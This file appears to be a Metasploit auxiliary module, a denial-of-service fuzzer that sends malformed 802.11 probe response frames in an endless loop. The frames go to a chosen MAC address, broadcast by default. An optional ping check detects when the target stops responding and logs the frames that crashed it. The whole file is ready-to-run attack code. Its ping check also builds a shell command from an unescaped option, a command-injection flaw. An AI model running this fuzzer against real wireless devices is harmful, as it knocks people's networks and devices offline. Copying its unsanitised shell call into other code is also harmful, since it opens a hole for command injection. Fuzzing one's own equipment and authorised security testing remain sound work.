##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Lorcon2
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Wireless Probe Response Frame Fuzzer',
			'Description'    => %q{
				This module sends out corrupted probe response frames.
			},

			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE
		))
		register_options(
			[
				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system",'FF:FF:FF:FF:FF:FF']),
				OptString.new('PING_HOST', [ false,  "Ping the wired address of the target host"])
			], self.class)
	end

	def ping_check
		1.upto(3) do |i|
			x = `ping -c 1 -n #{datastore['PING_HOST']}`
			return true if x =~ /1 received/
			if (i > 1)
				print_status("Host missed a ping response...")
			end
		end
		return false
	end

	def run

		srand(0)

		@@uni = 0

		frames = []

		open_wifi

		print_status("Sending corrupt frames...")

		while (true)
			frame = create_frame()

			if (datastore['PING_HOST'])

				if (frames.length >= 5)
					frames.shift
					frames.push(frame)
				else
					frames.push(frame)
				end

				1.upto(10) do
					wifi.write(frame)
					if (not ping_check())
						frames.each do |f|
							print_status "****************************************"
							print_status f.inspect
						end
						return
					end
				end
			else
				wifi.write(frame)
			end
		end
	end

	def create_frame
		mtu      = 500
		ies      = rand(1024)

		bssid    = Rex::Text.rand_text(6)
		seq      = [rand(255)].pack('n')

		frame =
			"\x50" +                      # type/subtype
			"\x00" +                      # flags
			"\x00\x00" +                  # duration
			eton(datastore['ADDR_DST']) + # dst
			bssid +                       # src
			bssid +                       # bssid
			seq   +                       # seq
			Rex::Text.rand_text(8) +      # timestamp value
			Rex::Text.rand_text(2) +      # beacon interval
			Rex::Text.rand_text(2)        # capability flags

		ssid = Rex::Text.rand_text_alphanumeric(rand(256))

		# ssid tag
		frame << "\x00" + ssid.length.chr + ssid

		# supported rates
		frame << "\x01" + "\x08" + "\x82\x84\x8b\x96\x0c\x18\x30\x48"

		# current channel
		frame << "\x03" + "\x01" + channel.chr

		1.upto(ies) do |i|
			max = mtu - frame.length
			break if max < 2
			t = rand(256)
			l = (max - 2 == 0) ? 0 : (max > 255) ? rand(255) : rand(max - 1)
			d = Rex::Text.rand_text(l)
			frame += t.chr + l.chr + d
		end

		return frame

	end

end
